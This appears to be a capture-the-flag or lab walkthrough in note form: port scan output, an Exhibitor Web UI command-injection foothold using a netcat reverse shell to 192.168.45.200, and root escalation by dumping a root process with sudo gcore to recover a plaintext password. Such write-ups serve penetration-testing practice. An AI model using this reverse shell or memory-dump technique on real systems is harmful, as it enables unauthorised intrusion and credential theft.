## OPEN PORTS 
```bash
# Open Ports
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp  open  http        Jetty 1.0
8081/tcp  open  http        nginx 1.14.2
34631/tcp open  java-rmi    Java RMI
```
## INITIAL FOOTHOLD
```bash
# Initial Foothold Exploit - # Exhibitor Web UI 1.7.1 - Remote Code Execution
https://www.exploit-db.com/exploits/48654

- Open the Exhibitor Web UI and click on the Config tab, then flip the Editing switch to ON
- In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:
- $(/bin/nc -e /bin/sh 192.168.45.200 80 &)
- Click Commit > All At Once > OK
- The command may take up to a minute to execute.
```
## PRIVILEGE ESCALTION
```bash
# Privilege Escalation
sudo -l 
 (ALL) NOPASSWD: /usr/bin/gcore 

- Dumps process run as root
- ps aux
- /usr/bin/password-store as root with PID 496

sudo /usr/bin/gcore 496
strings core.496

# Credentials for root
Password: root:ClogKingpinInning731

# Root
su root
Password: ClogKingpinInning731
```